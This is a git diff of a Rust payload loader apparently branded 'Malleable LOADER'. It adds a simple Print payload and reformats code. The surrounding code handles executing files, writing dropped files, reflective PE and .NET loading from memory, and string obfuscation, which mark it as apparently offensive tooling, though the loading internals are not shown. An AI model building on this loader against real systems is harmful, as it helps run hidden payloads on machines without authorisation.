@@ -1,10 +1,10 @@
 use crate::config::Config;
 use crate::link::{Link, LinkFetch};
-use crate::utils::calculate_path;
 use crate::payload_util::create_directory;
 use crate::payload_util::same_hash_sha512;
 use crate::payload_util::CommandLine;
 use crate::rundata::RunData;
+use crate::utils::calculate_path;
 
 #[cfg(target_os = "linux")]
 use crate::payload_util::fail_linux_message;
@@ -52,6 +52,7 @@ pub enum PayloadExecThread {
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub enum Payload {
     Banner(),
+    Print(Print),
     StopLoader(),
     WriteFile(WriteFile),
     WriteZip(WriteZip),
@@ -66,6 +67,7 @@ impl Payload {
     pub fn exec_payload(&self, config: &Config) -> PayloadExecThread {
         let exec_result = match &self {
             Payload::Banner() => banner(),
+            Payload::Print(payload) => payload.print_msg(config),
             Payload::StopLoader() => stoploader(),
             Payload::WriteFile(payload) => payload.write_file(config),
             Payload::WriteZip(payload) => payload.write_zip(config),
@@ -152,6 +154,7 @@ impl Payload {
     pub fn is_runonce(&self) -> bool {
         match &self {
             Payload::Banner() => false,
+            Payload::Print(payload) => payload.runonce,
             Payload::StopLoader() => false,
             Payload::WriteFile(payload) => payload.runonce,
             Payload::WriteZip(payload) => payload.runonce,
@@ -282,9 +285,10 @@ impl ExecPython {
 
 pub fn banner() -> Result<PayloadExecThread, anyhow::Error> {
     //TODO encrypt this str
-    let malleable=encrypt_string!("Malleable");
-    let loader=encrypt_string!("LOADER");
-    let banner: &str = &format!(r#"
+    let malleable = encrypt_string!("Malleable");
+    let loader = encrypt_string!("LOADER");
+    let banner: &str = &format!(
+        r#"
                                  ╓╖
                          , ▒╗,  ▒▒▒▒╖   ╓▒▒
   {malleable}                ░░▒▒▒╖▒▒▒▒╣╣╖▒▒▒┐
@@ -304,7 +308,8 @@ pub fn banner() -> Result<PayloadExecThread, anyhow::Error> {
                       ╙ ▒░▒╢╢╣╢▓╢╗              ▒╙░░▒╢▒╢╜╨╢▒
                         ╙▒░▒╢▒╣╣╣╨          ░ `  ░▒░║╣╢╜   `
                           "╨▒╜╢╢Ñ                  ░▒╜
-                                                 ``a "#);
+                                                 ``a "#
+    );
 
     let sleep_time = time::Duration::from_millis(3);
     for c in banner.chars() {
@@ -317,7 +322,6 @@ pub fn banner() -> Result<PayloadExecThread, anyhow::Error> {
     thread::sleep(sleep_time);
     Ok(PayloadExecThread::NoThread())
 }
-
 
 pub fn stoploader() -> Result<PayloadExecThread, anyhow::Error> {
     std::process::exit(0);
@@ -416,7 +420,6 @@ impl Exec {
     pub fn exec_file(&self) -> Result<PayloadExecThread, anyhow::Error> {
         let path: PathBuf = calculate_path(&self.path)?;
 
-
         info!("{}{:?} {}", encrypt_string!("Exec "), &path, &self.cmdline);
         let mut comm = Command::new(&path);
 
@@ -462,7 +465,6 @@ impl Exec {
     }
 }
 
-
 /*
 impl Exec {
     // https://doc.rust-lang.org/std/process/struct.Command.html
@@ -495,7 +497,6 @@ impl Exec {
     }
 }
 */
-
 
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub struct ReflectivePEFromMemory {
@@ -644,3 +645,16 @@ impl DotnetFromMemory {
     }
 }
 // TODO enlever les unwrap ici
+
+#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
+pub struct Print {
+    pub msg: CommandLine,
+    pub runonce: bool,
+}
+impl Print {
+    pub fn print_msg(&self, _config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
+        println!("{}", self.msg.get_string()?);
+        thread::sleep(time::Duration::from_millis(1000));
+        return Ok(PayloadExecThread::NoThread());
+    }
+}
